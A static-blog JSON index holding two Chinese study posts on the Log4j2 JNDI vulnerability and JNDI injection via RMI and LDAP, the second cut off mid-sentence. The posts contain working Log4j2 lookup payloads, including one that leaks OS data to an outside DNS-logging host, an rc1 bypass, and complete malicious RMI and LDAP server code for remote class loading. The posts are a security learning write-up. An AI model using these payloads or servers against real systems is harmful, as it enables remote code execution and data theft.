{"meta":{"title":"Ethe's blog","subtitle":"Etheの博客","description":"","author":"Ethe","url":"https://Ethe448.github.io","root":"/"},"pages":[{"title":"404","date":"2022-01-17T03:58:22.000Z","updated":"2022-01-17T03:58:42.774Z","comments":true,"path":"404/index.html","permalink":"https://ethe448.github.io/404/index.html","excerpt":"","text":""},{"title":"contact","date":"2022-01-16T13:54:11.000Z","updated":"2022-01-17T07:10:36.704Z","comments":true,"path":"contact/index.html","permalink":"https://ethe448.github.io/contact/index.html","excerpt":"","text":""},{"title":"about","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:53:25.024Z","comments":true,"path":"about/index.html","permalink":"https://ethe448.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:57:26.689Z","comments":true,"path":"categories/index.html","permalink":"https://ethe448.github.io/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2022-01-16T13:54:20.000Z","updated":"2022-01-16T13:55:40.821Z","comments":true,"path":"friends/index.html","permalink":"https://ethe448.github.io/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2022-01-16T13:52:57.000Z","updated":"2022-01-16T13:53:57.523Z","comments":true,"path":"tags/index.html","permalink":"https://ethe448.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"log4j2漏洞","slug":"log4j2漏洞","date":"2023-06-04T06:14:13.000Z","updated":"2023-06-06T09:43:14.359Z","comments":true,"path":"2023/06/04/log4j2漏洞/","link":"","permalink":"https://ethe448.github.io/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"看面经和复习期末考试都怪无聊的，看点这个核弹级漏洞 背景2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。阿里云应急响应中心提醒 Apache Log4j2 用户尽快采取安全措施阻止漏洞攻击。 log4j2远程代码执行漏洞主要由于存在JNDI注入漏洞，黑客可以恶意构造特殊数据请求包，触发此漏洞，从而成功利用此漏洞可以在目标服务器上执行任意代码。 （阿里好像还因为没先跟cnvd说所以被罚了 前置知识Log4j2Apache Log4j 2是对Log4j的升级，它比其前身Log4j 1.x提供了重大改进，并提供了Logback中可用的许多改进，同时修复了Logback架构中的一些问题。是目前最优秀的Java日志框架之一。 本次漏洞影响范围为Log4j2最早期的版本2.0-beta9到2.14.1。 由于Log4j2重新构建和设计了框架，所以可以认为两者是完全独立的两个日志组件。但是他们的包还是很相似，这里给出一点差异 Log4j2分为2个jar包，一个是接口log4j-api-${版本号}.jar，一个是具体实现log4j-core-${版本号}.jar。Log4j只有一个jar包log4j-${版本号}.jar。Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。Log4j2的package名称前缀为org.apache.logging.log4j。Log4j的package名称前缀为org.apache.log4j。 具体的发展过程可以看看这个https://paper.seebug.org/1789/的Java日志体系部分 JNDIjava命名和目录接口 它就像一个映射关系库，里面有很多资源，每个资源对应一个名字，当我查看这个名字时候，就会提供对应资源。将资源和名字进行了一对一映射。一些基本操作，发布服务bind(),查找服务lookup()。 LDAP协议 轻型目录访问协议 LDAP可以理解是一个简单存储数据的数据库，不过它是树状结构的，树形结构存储数据，查询效率更高。 JNDI注入第一个是由于JNDI的动态协议转换，即使初始化的context指定了协议，也会根据URL传入的参数来转换协议。 其实就是说即使提前配置了Context.PROVIDER_URL属性，当我们调用lookup()方法时，如果lookup方法的参数是一个url地址，那么客户端就会去lookup()方法参数指定的uri中加载远程对象，而不是去Context.PROVIDER_URL设置的地址去加载对象。 正是因为有这个特性，才导致当lookup()方法的参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。 第二个是由于JNDI Naming Reference，Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 LDAP 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。 其实可以简单理解为我这LDAP存储空间有限，我把多余的数据放在我的一个web网站里面，可以通过url地址进行引用，查询的数据如果我自己数据库里面没有，我就会自动去我这个指定的地址在web网站查找指定资源。 （这里jndi注入那篇写的有点赶，所以就没怎么细说原理，就在这里补上了 Log4j2源码浅析然后简单分析一下源码 环境配置先引入依赖 &lt;dependencies> &lt;dependency> &lt;groupId>org.apache.logging.log4j&lt;/groupId> &lt;artifactId>log4j-core&lt;/artifactId> &lt;version>2.14.0&lt;/version> &lt;/dependency> &lt;/dependencies> 在工程目录resources下创建log4j2.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?> &lt;configuration status=\"error\"> &lt;appenders> &lt;!-- 配置Appenders输出源为Console和输出语句SYSTEM_OUT--> &lt;Console name=\"Console\" target=\"SYSTEM_OUT\" > &lt;!-- 配置Console的模式布局--> &lt;PatternLayout pattern=\"%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n\"/> &lt;/Console> &lt;/appenders> &lt;loggers> &lt;root level=\"error\"> &lt;appender-ref ref=\"Console\"/> &lt;/root> &lt;/loggers> &lt;/configuration> log4j2中包含两个关键组件LogManager和LoggerContext。LogManager是Log4J2启动的入口，可以初始化对应的LoggerContext。LoggerContext会对配置文件进行解析等其它操作。 在不使用slf4j的情况下常见的Log4J用法是从LogManager中获取Logger接口的一个实例，并调用该接口上的方法。运行下列代码查看打印结果 属性占位符之Interpolator插值器log4j2中环境变量键值对被封装为了StrLookup对象。这些变量的值可以通过属性占位符来引用，格式为:$&#123;prefix:key&#125;。在Interpolator插值器内部以Map的方式则封装了多个StrLookup对象，如下图显示： 简单说就是通过${prefix:key}这种方式可以调用这里面存的环境变量 然后在输出错误信息的时候 会进行一个检测 先找strLookupMap里有没有这个prefix 比如这里这个prefix就是java 然后就会去调用对应的lookup方法 假如我把java改成marker 那再假如这里不是marker，而是jndi，那调用的就会是jndi的lookup，就有可能会造成jndi的注入 这里虽然是JndiLookup，但是看名字最后调用的应该就是jndi的lookup，先不往下跟了，之后再说 模式布局log4j2支持通过配置Layout打印格式化的指定形式日志，可以在Appenders的后面附加Layouts来完成这个功能。常用之一有PatternLayout，也就是我们在配置文件中PatternLayout字段所指定的属性pattern的值%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n。 %msg表示所输出的消息 PatternLayout模式布局会通过PatternProcessor模式解析器，对模式字符串进行解析，得到一个List&lt;PatternConverter&gt;转换器列表和List&lt;FormattingInfo&gt;格式信息列表。在配置文件PatternLayout标签的pattern属性中我们可以看到类似%d的写法，d代表一个转换器名称，log4j2会通过PluginManager收集所有类别为Converter的插件,同时分析插件类上的@ConverterKeys注解,获取转换器名称,并建立名称到插件实例的映射关系，当PatternParser识别到转换器名称的时候,会查找映射。 序号 名称 类型 描述 1 d date DatePatternConverter 日志的时间戳 2 p level LevelPatternConverter 日志级别 3 m msg message MessagePatternConverter 日志中的消息内容 4 C class ClassNamePatternConverter 日志打印点所在类的类名 注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置 5 M method MethodLocationPatternConverter 日志打印点所在方法的方法名 注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置 6 c logger LoggerPatternConverter Logger实例的名称 7 n LineSeparatorPatternConverter 专门追加换行符 8 properties Log4j1MdcPatternConverter 9 ndc Log4j1NdcPatternConverter 10 enc encode EncodingPatternConverter 11 equalsIgnoreCase EqualsIgnoreCaseReplacementConverter 12 equals EqualsReplacementConverter 13 xEx xThroable xException ExtendedThrowablePatternConverter 14 F file FileLocationPatternConverter 注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置 15 l location FullLocationPatternConverter 相当于%C.%M(%F:%L) 注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置 16 highlight HighlightConverter 17 L line LineLocationPatternConverter 日志打印点的代码行数 注意:需要给LoggerincludeLocation=&quot;true&quot;属性开启位置 18 K map MAP MapPatternConverter 19 marker MarkerPatternConverter 打印完整标记,格式如:标记名[父标记名[祖父标记名]],一个标记可以有多个父标记 20 markerSimpleName MarkerSimpleNamePatternConverter 只打印标记的名称 21 maxLength maxLen MaxLengthConverter 22 X mdc MDC MdcPatternConverter LogEvent.getContextData()映射诊断上下文 23 N nano NanoTimePatternConverter 24 x NDC NdcPatternConverter LogEvent.getContextStack()嵌套诊断上下文 25 replace RegexReplacementConverter 26 r relative RelativeTimePatternConverter 27 rEx rThrowable rException RootThrowablePatternConverter 28 style StyleConverter 29 T tid threadId ThreadIdPatternConverter 线程id 30 t tn thread threadName ThreadNamePatternConverter 线程名称 31 tp threadPriority ThreadPriorityPatternConverter 线程优先级 32 ex throwable Exception ThrowablePatternConverter 异常 33 u uuid UuidPatternConverter 生成一个uuid,随日志一起打印,用于唯一标识一条日志 34 notEmpty varsNotEmpty variablesNotEmpty VariablesNotEmptyReplacementConverter 简单说就是如果配置文件里写的是%msg这种，就去找MessagePatternConverter进行处理 这个MessagePatternConverter也是log4j漏洞产生的一个重要原因 日志级别log4j2支持多种日志级别，通过日志级别我们可以将日志信息进行分类，在合适的地方输出对应的日志。哪些信息需要输出，哪些信息不需要输出，只需在一个日志输出控制文件中稍加修改即可。级别由高到低共分为6个：fatal(致命的), error, warn, info, debug, trace(堆栈)。 log4j2还定义了一个内置的标准级别intLevel，由数值表示，级别越高数值越小。 当日志级别（调用）大于等于系统设置的intLevel的时候，log4j2才会启用日志打印。在存在配置文件的时候 ，会读取配置文件中&lt;root level=&quot;error&quot;&gt;值设置intLevel。当然我们也可以通过Configurator.setLevel(&quot;当前类名&quot;, Level.INFO);来手动设置。 如果没有配置文件也没有指定则会默认使用Error级别，也就是200 漏洞细节复现网上最常见的就是dnslog的payload $&#123;jndi:ldap:&#x2F;&#x2F;xxxx.ceye.io&#125; 其实就是调用jndi的lookup，然后url就是dns://xxxx.ceye.io。让被攻击侧往这个url上发起dns请求 这里我就直接用ldap弹计算器了 首先是开启一个本地的ldap服务端，然后python在恶意字节码目录下起个服务 跟一下流程 把断点下在org/apache/logging/log4j/core/appender/AbstractOutputStreamAppender.java中的directEncodeEvent方法上 这里会获取当前使用的布局，然后调用对应的encode方法 默认的话就是PatternLayout 所以就会调用PatternLayout的encode方法 这里面有个toText方法 接着进入toSerializable 这里边就会调用不同的Converter来处理传入的数据 这里我们只跟MessagePatternConverter 在MessagePatternConverter 的format里，对字符串进行了处理 最主要的就是这个if里 可以看到第二行重设了workingBuilder这个StringBuilder对象的长度，把原本的83改成了50 这个50就是在输出的这行日志中出现$字符的位置 也就是说把${jndi:ldap://127.0.0.1:9999/exp}单独切了出来，不在workingBuilder里了 然后最后一行又进行了一个append操作，加入的内容是config.getStrSubstitutor().replace(event, value) 这里又是个替换 使用 Apache Commons Configuration 库中的 StrSubstitutor 对象来替换字符串中的占位符。 StrSubstitutor 是一个用于替换字符串中的变量的工具类。它可以根据提供的键值对，将字符串中的占位符替换为对应的值。通常情况下，占位符使用 $&#123;&#125; 或者 $() 包围。 value就是我们之前切出来的${jndi:ldap://127.0.0.1:9999/exp} 继续跟进会到Interpolator.lookup 这里就是之前说的插值器的地方 先根据var.indexOf(PREFIX_SEPARATOR);判断&quot;:&quot;之前的字符 再通过 final String prefix &#x3D; var.substring(0, prefixPos).toLowerCase(Locale.US); final String name &#x3D; var.substring(prefixPos + 1); 把第一个:前后的东西分离 然后因为我们这里是jndi，所以这里的lookup就是JndiLookup 很自然就进JndiLookup的lookup方法里了 继续进jndiManager.lookup 这个jndiName就是我们写的恶意ldap的url了 现在到了InitialContext的lookup里了 后边就纯ldap的jndi的路了 恶意url也传进去了 到这里漏洞流程就结束了，但是还有一点问题 比如在源码解析里的日志级别好像并没有提到 日志级别也是影响是否能实现log4j2漏洞的一个因素 原因就是不管输出哪个级别的日志，都要调用这一个方法 logIfEnabled方法用来判断日志优先级 由于默认情况下是error，所以小于error的warn, info, debug, trace都不会满足这个判断，直接就返回了，不能接着往下走，也就不会触发漏洞了 可以在配置文件里自行设置优先级 外带就dnslog外带，也没啥特别的，只不过是借助log4j2的递归解析 $&#123;jndi:ldap:&#x2F;&#x2F;$&#123;java:os&#125;.2lnhn2.ceye.io&#125; 先解析${java:os}，把东西拿到，然后再去发起请求 rc1绕过在爆出log4j2这个核弹级漏洞后，apache自然是进行了修复 这次修复把MessagePatternConverter这个类进行了大改 我直接截个先知社区的图 并且在 2.15.0-rc1的更新包中，移除了从 Properties 中获取 Lookup 配置的选项，并修改判断逻辑，默认不开启 lookup 功能。 还有就是在JndiManager#lookup 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。 感觉不是很好利用，属于是除了ctf故意出题想不到还存在的场景了 所以就简单说了 rc1把format挪到LookupMessagePatternConverter里了 而只有在开启 lookup 功能时才会使用 LookupMessagePatternConverter 来进行 Lookup 和替换 所以必须在配置文件里开启lookup才行 就是在%msg后边加个{lookups} 然后又因为还有个地址校验，只允许本地的发起请求了 但是这个东西有个最离谱的问题，就是它的catch里没return 所以只要try里报错，就直接进this.context.lookup了 所以就在exp前边加个空格让触发 URISyntaxException 异常 $&#123;jndi:ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F; exp&#125; rc2在catch里把return加上了 似乎是还有绕过方法，但是对于那种配置文件要求苛刻的绕过，感觉意义不是很大 2.16.0-rc1直接不支持日志信息的lookup了，所以log4j2漏洞就彻底结束了 总结看起来log4j2的原理并不麻烦，甚至有点简单，但是我还是有点不太理解的地方，就是log4j2作为一个日志，为什么要去支持jndi的lookup，为什么要去远程请求东西。（可能确实用处不大吧，毕竟2.16版本直接删了 另外对于log4j2的jndi注入还衍生出了许多技巧。例如编码绕过、关键字截取、Appenders等，这里就不详细写了，用到再搜吧（ 参考文章https://su18.org/post/log4j2/ https://paper.seebug.org/1789/ log4j2漏洞原理和漏洞环境搭建复现_log4j2原理_糊涂是福yyyy的博客-CSDN博客","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"}]},{"title":"JNDI注入","slug":"JNDI注入","date":"2023-05-22T03:21:36.000Z","updated":"2023-05-24T04:34:07.189Z","comments":true,"path":"2023/05/22/JNDI注入/","link":"","permalink":"https://ethe448.github.io/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/","excerpt":"","text":"终于学到JNDI了，其实最开始的时候我是在学fastjson的，然后发现fastjson要用JNDI，所以又想去学JNDI，但是JNDI里又用了很多RMI的内容，所以只好花了几天把之前看了个开头的RMI重新看了一遍。 JNDI概述JNDI(Java Naming and Directory Interface，Java命名和目录接口)是为Java应用程序提供命名和目录访问服务的API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如RMI、CORBA、LDAP、DNS等。其中Naming Service类似于哈希表的K/V对，通过名称去获取对应的服务。Directory Service是一种特殊的Naming Service，用类似目录的方式来存取服务。 这些命名/目录服务提供者有 RMI（JAVA远程方法调用） LDAP（轻量级目录访问协议） CORBA（公共对象请求代理体系结构） DNS（域名服务） 在JNDI注入的过程中我们常用的就是RMI和LDAP （下面这个表是抄的，不太确定，感觉在JDK8的时候最起码应该是8u121吧 JDK6 JDK7 JDK8 JDK11 RMI可用 6u132以下 7u122以下 8u113以下 无 LDAP可用 6u211以下 7u201以下 8u191以下 11.0.1以下 JNDI结构在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是： javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类； javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类； javax.naming.event：在命名目录服务器中请求事件通知； javax.naming.ldap：提供LDAP支持； javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。 JNDI里的类写一点jndi要用到的类的作用 InitialContext类构造方法InitialContext() 构建一个初始上下文。 InitialContext(boolean lazy) 构造一个初始上下文，并选择不初始化它。 InitialContext(Hashtable&lt;?,?&gt; environment) 使用提供的环境构建初始上下文。 代码： InitialContext initialContext &#x3D; new InitialContext(); 在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。 常用方法bind(Name name, Object obj) 将名称绑定到对象。 list(String name) 枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。 lookup(String name) 检索命名对象。 rebind(String name, Object obj) 将名称绑定到对象，覆盖任何现有绑定。 unbind(String name) 取消绑定命名对象。 代码： package com.rmi.demo; import javax.naming.InitialContext; import javax.naming.NamingException; public class jndi &#123; public static void main(String[] args) throws NamingException &#123; String uri &#x3D; &quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;work&quot;; InitialContext initialContext &#x3D; new InitialContext(); initialContext.lookup(uri); &#125; &#125; Reference类该类也是在javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。 构造方法Reference(String className) 为类名为“className”的对象构造一个新的引用。 Reference(String className, RefAddr addr) 为类名为“className”的对象和地址构造一个新引用。 Reference(String className, RefAddr addr, String factory, String factoryLocation) 为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 Reference(String className, String factory, String factoryLocation) 为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。 代码： String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;; Reference reference &#x3D; new Reference(&quot;test&quot;, &quot;test&quot;, url); 参数1：className - 远程加载时所使用的类名 参数2：classFactory - 加载的class中需要实例化类的名称 参数3：classFactoryLocation - 提供classes数据的地址可以是file/ftp/http协议 常用方法void add(int posn, RefAddr addr) 将地址添加到索引posn的地址列表中。 void add(RefAddr addr) 将地址添加到地址列表的末尾。 void clear() 从此引用中删除所有地址。 RefAddr get(int posn) 检索索引posn上的地址。 RefAddr get(String addrType) 检索地址类型为“addrType”的第一个地址。 Enumeration&lt;RefAddr&gt; getAll() 检索本参考文献中地址的列举。 String getClassName() 检索引用引用的对象的类名。 String getFactoryClassLocation() 检索此引用引用的对象的工厂位置。 String getFactoryClassName() 检索此引用引用对象的工厂的类名。 Object remove(int posn) 从地址列表中删除索引posn上的地址。 int size() 检索此引用中的地址数。 String toString() 生成此引用的字符串表示形式。 代码： package com.rmi.demo; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class jndi &#123; public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException &#123; String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;; Registry registry &#x3D; LocateRegistry.createRegistry(1099); Reference reference &#x3D; new Reference(&quot;test&quot;, &quot;test&quot;, url); ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference); registry.bind(&quot;aa&quot;,referenceWrapper); &#125; &#125; 基本使用以一个rmi服务为例子，你先得创建一个rmi服务，然后再创建JNDI的服务端和客户端，文件结构就是之前文章中的RMI基础上再加上JNDI服务端和客户端 JNDI服务端 public class JNDIRMIServer &#123; public static void main(String[] args) throws NamingException, RemoteException &#123; InitialContext initialContext&#x3D;new InitialContext(); initialContext.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;,new IRemoteObjImpl()); &#125; &#125; JNDI客户端 public class JNDIRMIClient &#123; public static void main(String[] args) throws NamingException, RemoteException &#123; InitialContext initialContext&#x3D;new InitialContext(); IRemoteObj lookup &#x3D; (IRemoteObj) initialContext.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;); System.out.println(lookup.sayHello()); &#125; &#125; 然后启动RMI服务端和JNDI服务端，再启动JNDI客户端，就能得到调用hello方法的结果（感觉和RMI区别不是很大 这里跟一下lookup和rebind会发现其实调的就是RMI的时候的那个 所以这里打rmi的几个方法打JNDI应该也行（没试过，猜的，试了一下客户端恶意传参打服务端和绕JEP290的payload，确实能打 JNDI注入JNDI注入有以下几个条件 1.使用lookup 2.参数可控 在基本使用的部分，我们使用JNDI结合RMI进行了测试，但是在一般的JNDI注入中，我们绑定的都是引用对象（JNDI Reference） 基于RMI先看基于RMI的JNDI注入，这里服务端代码为 public class JNDIRMIServer &#123; public static void main(String[] args) throws NamingException, RemoteException &#123; &#x2F;&#x2F; LocateRegistry.createRegistry(1099); LocateRegistry.createRegistry(1099); InitialContext initialContext&#x3D;new InitialContext(); &#x2F;&#x2F;创建一个引用，第一个参数是恶意class的名字，第二个参数是beanfactory的名字，我们自定义(和class文件对应),第三个参数表示恶意class的地址。url最后的斜线一定要加，不然会访问不到对应的class文件 Reference reference &#x3D; new Reference(&quot;evil&quot;, &quot;evil&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;&quot;); initialContext.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;,reference); &#125; &#125; 这里第一个evil就相当于这个恶意class类叫evil.class，第二个evil就相当于这个evil.class里的evil类 客户端 import javax.naming.InitialContext; import javax.naming.NamingException; import java.rmi.RemoteException; public class JNDIRMIClient &#123; public static void main(String[] args) throws NamingException, RemoteException &#123; InitialContext initialContext&#x3D;new InitialContext(); IRemoteObj lookup &#x3D; (IRemoteObj) initialContext.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;remoteobj&quot;); System.out.println(lookup.sayHello()); &#125; &#125; 这东西原理其实挺简单的，就我们可以控制客户端lookup里的值，所以就可以控制客户端去请求我们的恶意服务端，然后服务端就会给客户端返回一个Reference类型的值，接下来客户端就想去找这个东西，这里找的过程是先去看本地有没有，本地没有就会去我们给的那个地址上去请求 这里可以写一下流程 首先是绑定的时候，之前RMI提到过，想绑定，那这个必须实现Remote接口和继承UnicastRemoteObject 那我们怎么能绑定它呢？ 首先想到的肯定是找个东西封装一下 我们这里选择ReferenceWrapper类 所以有一些博客就在恶意服务端里加了一句 ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); 但其实这是完全多余的行为 我们可以跟一下调用的bind方法，可以知道最后在RegistyContext里会进RMI自己的lookup，同时还对我们传进去的东西执行了个encodeObject的方法 跟进去可以看到，如果你是Reference类型的，就会自动给你加个ReferenceWrapper的封装，所以根本不需要我们手动添加 然后再看客户端获取的时候，同样调到RegistyContext中的lookup里 然后进行一个解封装操作 然后在这行调用NamingManager.getObjectInstance，再其中又调用了getObjectFactoryFromReference，剩下的看注释就知道了，先找本地，再找远程 所以这里我把evil.class换个地方，然后本地开个服务 试了一下RMI的时候没试的操作 把恶意class文件放服务器上也行 另外就是在8u121之后，RMI服务默认不允许远程加载，所以想要继续用得加一行 至于为什么要加这一行，而不是加在RMI攻击服务端的时候的那几行，我也不知道，可能这也是JNDI和RMI的区别吧（，反正不加就报错告诉你要把这个值改成true 查了一下，在JDK 6u141、7u131、8u121 及以后的版本 官方把 com.sun.jndi.rmi.object.trustURLCodebase com.sun.jndi.cosnaming.object.trustURLCodebase 这两个值设为了false，所以不能再从codebase中加载类了，所以最开始的表好像确实不对 基于LDAP从上边那段我们知道，在8u121之后，由于trustURLCodebase的值默认为false，所以不能远程加载类了，除非被攻击的客户端还有System.setProperty(&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;, &quot;true&quot;);这行代码。但是，希望要握在自己手中（。所以RMI不行了之后我们还可以试试LDAP 其实主要是对trustURLCodebase这个值的判断放到RegistyContext里了，但是其实真正加载恶意类的是NamingManager里。所以用ldap就能绕过 LDAP介绍 LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。 也就是说，LDAP 「是一个协议」，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 「LDAP 协议的实现」，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。 在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下 dn ：一条记录的详细位置 dc ：一条记录所属区域 (哪一颗树) ou ：一条记录所属组织 （哪一个分支） cn&#x2F;uid：一条记录的名字&#x2F;ID (哪一个苹果名字) ... LDAP目录树的最顶部就是根，也就是所谓的“基准DN&quot;。 先安装LDAP的依赖 &lt;dependency> &lt;groupId>com.unboundid&lt;/groupId> &lt;artifactId>unboundid-ldapsdk&lt;/artifactId> &lt;version>3.1.1&lt;/version> &lt;/dependency> 然后起一个恶意的LDAP的服务端 package com; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LDAPIRMServer&#123; private static final String LDAP_BASE &#x3D; &quot;dc&#x3D;example,dc&#x3D;com&quot;; public static void main ( String[] tmp_args ) &#123; String[] args&#x3D;new String[]&#123;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;#EXP&quot;&#125;;&#x2F;&#x2F;这个EXP就是恶意class类的名 int port &#x3D; 9999; try &#123; InMemoryDirectoryServerConfig config &#x3D; new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( &quot;listen&quot;, &#x2F;&#x2F;$NON-NLS-1$ InetAddress.getByName(&quot;0.0.0.0&quot;), &#x2F;&#x2F;$NON-NLS-1$ port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ]))); InMemoryDirectoryServer ds &#x3D; new InMemoryDirectoryServer(config); System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); &#x2F;&#x2F;$NON-NLS-1$ ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; public OperationInterceptor ( URL cb ) &#123; this.codebase &#x3D; cb; &#125; @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base &#x3D; result.getRequest().getBaseDN(); Entry e &#x3D; new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl &#x3D; new URL(this.codebase, this.codebase.getRef().replace(&#39;.&#39;, &#39;&#x2F;&#39;).concat(&quot;.class&quot;)); System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl); e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;); String cbstring &#x3D; this.codebase.toString(); int refPos &#x3D; cbstring.indexOf(&#39;#&#39;); if ( refPos &gt; 0 ) &#123; cbstring &#x3D; cbstring.substring(0, refPos); &#125; e.addAttribute(&quot;javaCodeBase&quot;, cbstring); e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;); &#x2F;&#x2F;$NON-NLS-1$ e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125; &#125; 别问为啥这么写，固定的（，就改一下恶意类存放的地址就行 客户端 package com; import javax.naming.InitialContext; import javax.naming.NamingException; public class JNDILDAPClient &#123; public static void main(String[] args) throws NamingException &#123; InitialContext initialContext&#x3D;new InitialContext(); initialContext.lookup(&quot;ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F;a&quot;);&#x2F;&#x2F;后边无所谓，只要有东西就行，应该是服务器脚本给自动做了处理 &#125; &#125; 然后本地起个python服务执行就能弹出计算器了 同样跟一下执行流程 其实感觉没啥好跟的 首先就是一路lookup，到Obj这个类里 然后在decodeObject判断绑定的是个什么东西，这里我们是个引用类型的，所以就进decodeReference了 在decodeReference里就把引用里的东西解出来 解出来之后就在LdapCtx去加载这里面的东西 调用DirectoryManager.getObjectInstance 然后在这里面又调用了NamingManager#getObjectFactoryFromReference，去获取工厂地址。后面就和基于RMI的一模一样了 在getObjectFactoryFromReference里加载类，然后实例化 可以看到，这两种不同的方法，其实际目的都是为了调用NamingManager#getObjectFactoryFromReference，然后去远程加载恶意的字节码文件。 不过在6u211以后 、7u201以后 、8u191以后 